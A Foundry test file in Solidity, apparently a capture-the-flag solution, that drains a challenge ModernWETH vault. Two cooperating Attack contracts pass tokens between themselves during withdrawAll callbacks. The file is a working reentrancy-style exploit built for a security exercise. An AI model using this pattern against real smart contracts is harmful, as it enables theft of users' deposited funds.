// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import {ModernWETH} from "../src/2_ModernWETH/ModernWETH.sol";

/*////////////////////////////////////////////////////////////
//          DEFINE ANY NECESSARY CONTRACTS HERE             //
//    If you need a contract for your hack, define it below //
////////////////////////////////////////////////////////////*/
interface IModernEth {
    function deposit() external payable;

    function withdraw(uint256 wad) external;

    function withdrawAll() external;

    function balanceOf(address) external view returns (uint);

    function transfer(address, uint) external;
}

contract Attack {
    ModernWETH public etherVault;
    // IModernEth public immutable etherVault;
    Attack public attackPeer;

    address private attacker;

    constructor(ModernWETH _etherVault,address _attacker) {
        etherVault = _etherVault;
        attacker=_attacker;
    }

    function setAttackPeer(Attack _attackPeer) external {
        attackPeer = _attackPeer;
    }
    function withdraw()external{
        require(msg.sender==attacker,"Only Attacker can call this function");
        payable(attacker).transfer(address(this).balance);
    }
    receive() external payable {
        payable(attacker).transfer(address(this).balance-1 ether);
        if (address(etherVault).balance >= 1 ether) {
            etherVault.transfer(
                address(attackPeer),
                etherVault.balanceOf(address(this))
            );
        }
    }

    function attackInit() external payable {
        if(msg.value >= 1 ether){
        etherVault.deposit{value: 1 ether}();
        etherVault.withdrawAll();        
        }
        
    }

    function attackNext() external {
        etherVault.withdrawAll();
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

/*////////////////////////////////////////////////////////////
//                     TEST CONTRACT                        //
////////////////////////////////////////////////////////////*/
contract Challenge2Test is Test {
    ModernWETH public modernWETH;
    address public whitehat = makeAddr("whitehat");

    function setUp() public {
        modernWETH = new ModernWETH();

        /// @dev contract has locked 1000 ether, deposited by a whale, you must rescue it
        address whale = makeAddr("whale");
        vm.deal(whale, 1000 ether);
        vm.prank(whale);
        modernWETH.deposit{value: 1000 ether}();

        /// @dev you, the whitehat, start with 10 ether
        vm.deal(whitehat, 10 ether);
    }

    receive() external payable {
        // uint victimEthers=address(modernWETH).balance;
        // if(victimEthers<=1 ether ){
        //     console.log("victim is exhausted");
        // }
        // modernWETH.deposit{value:msg.value}();
    }

    function testWhitehatRescue() public {
        // Approach 2

        vm.startPrank(whitehat, whitehat);
        uint whitehatBalanceBefore=whitehat.balance;

        Attack attacker1 = new Attack(modernWETH,whitehat);
        Attack attacker2 = new Attack(modernWETH,whitehat);
        attacker1.setAttackPeer(attacker2);
        attacker2.setAttackPeer(attacker1);
        /** */
        uint totalBalanceRemaining=address(modernWETH).balance;
        for (uint i = 1; totalBalanceRemaining>10 ether; i++) {

            if (i % 2 == 0) {
                attacker1.attackInit{value: 1 ether}();
                attacker2.attackNext();
            } else {
                attacker2.attackInit{value: 1 ether}();
                attacker1.attackNext();
            }
            totalBalanceRemaining=address(modernWETH).balance;
            // console.log("Total Balance Remaining",totalBalanceRemaining);
        }
        attacker1.withdraw();
        attacker2.withdraw();
        
        uint whitehatBalanceAfter=whitehat.balance;
        uint totalRecovered=(whitehatBalanceAfter-whitehatBalanceBefore)/10**18;
        console.log("Total recovered ",totalRecovered," ETH");
        totalBalanceRemaining=address(modernWETH).balance/10**18;
        // console.log("Total Balance still locked in contract ",totalBalanceRemaining);
        console.log("Percentage Recovered",(totalRecovered*100/1000) ,"%");

        // console.log("Contract 1 ETH ", address(attacker1).balance);
        // console.log("Contract 2 ETH ", address(attacker2).balance);

        // console.log("METH ",modernWETH.balanceOf(address(attacker))," ETH", address(attacker).balance);

        // console.log("Contarct address",address(this));

        // vm.startPrank(whitehat, whitehat);
        /*////////////////////////////////////////////////////
        //               Add your hack below!               //
        //                                                  //
        // terminal command to run the specific test:       //
        // forge test --match-contract Challenge2Test -vvvv //
        ////////////////////////////////////////////////////*/
        // console.log("balances before whitehat                  ",modernWETH.balanceOf(whitehat),whitehat.balance );
        // console.log("balances before contract                  ",modernWETH.balanceOf(address(modernWETH)) ,address(modernWETH).balance );
        // modernWETH.deposit{value:1 ether}();
        // console.log("balances after deposit whitehat           ",modernWETH.balanceOf(whitehat),whitehat.balance );
        // console.log("balances after deposit contract           ",modernWETH.balanceOf(address(modernWETH)) ,address(modernWETH).balance );

        // modernWETH.withdrawAll();
        // console.log("Attacker Ether balance before attack",address(this).balance/(10**18));

        // for (uint i = 1; i<10; i++) {
        //     console.log("Attacker Ether balance",address(this).balance/(10**18));
        //     uint bal=modernWETH.balanceOf(address(this));
        //     if(bal<1000 ether){
        //     console.log("Attacker modern WETH balance ",bal/(10**18));
        //     modernWETH.withdraw(bal);
        //     }
        //     else{
        //         i=10;
        //     }
        // }
        // console.log("balances after withdrawAll1 whitehat      ",modernWETH.balanceOf(whitehat),whitehat.balance );
        // console.log("balances after withdrawAll1 contract      ",modernWETH.balanceOf(address(modernWETH)) ,address(modernWETH).balance );

        // modernWETH.withdrawAll();
        // console.log("balances after withdrawAll2 whitehat      ",modernWETH.balanceOf(whitehat),whitehat.balance );
        // console.log("balances after withdrawAll2 contract      ",modernWETH.balanceOf(address(modernWETH)) ,address(modernWETH).balance );

        // modernWETH.withdraw(1 ether);

        //==================================================//
        // vm.stopPrank();

        // assertEq(address(modernWETH).balance, 0, "ModernWETH balance should be 0");
        // // @dev whitehat should have more than 1000 ether plus 10 ether from initial balance after the rescue
        // assertEq(address(whitehat).balance, 1010 ether, "whitehat should end with 1010 ether");
    }
    
}
